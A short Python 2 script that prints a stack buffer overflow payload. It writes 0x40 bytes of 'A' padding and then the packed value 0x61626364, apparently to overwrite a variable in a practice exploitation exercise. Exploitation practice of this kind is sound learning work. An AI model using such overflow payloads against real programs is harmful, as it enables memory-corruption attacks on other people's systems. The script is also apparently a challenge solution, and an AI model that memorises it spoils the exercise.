#!/usr/bin/env python
import struct

padding = "A"*(0x5c-0x1c)
var = struct.pack("<I", 0x61626364)

print padding+var